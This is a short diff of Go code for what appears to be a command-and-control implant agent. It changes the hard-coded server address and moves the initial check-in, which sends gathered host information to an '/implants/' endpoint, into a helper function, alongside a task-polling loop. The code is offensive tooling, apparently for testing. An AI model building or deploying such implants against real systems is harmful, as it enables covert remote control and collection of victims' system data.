@@ -41,22 +41,15 @@ func ParseTasks(serverUrl string, tasking string) (string, error) {
 	return "", nil
 }
 
+
+
 func main() {
 
 	retryCounter := 0
-	serverUrl := "https://192.168.15.25:8000"
-
+	serverUrl := "https://192.168.15.45:8000"
 	initialInfo := agent_helper.GatherInfo()
-
 	time.Sleep(time.Duration(agent_helper.CallbackTimer.StartDelay) * time.Second)
-
-	// register with server
-	_, err := agent_helper.PostJson(serverUrl+"/implants/", initialInfo)
-	if err != nil {
-		panic(err)
-	}
-
-	// listen for sigterm and sigint (testing only)
+	agent_helper.InitialCheckin(serverUrl, initialInfo)
 	agent_helper.SigHandler(serverUrl, initialInfo.Session)
 
 	for {
@@ -92,3 +85,4 @@ func main() {
 		timer.Stop()
 	}
 }
+
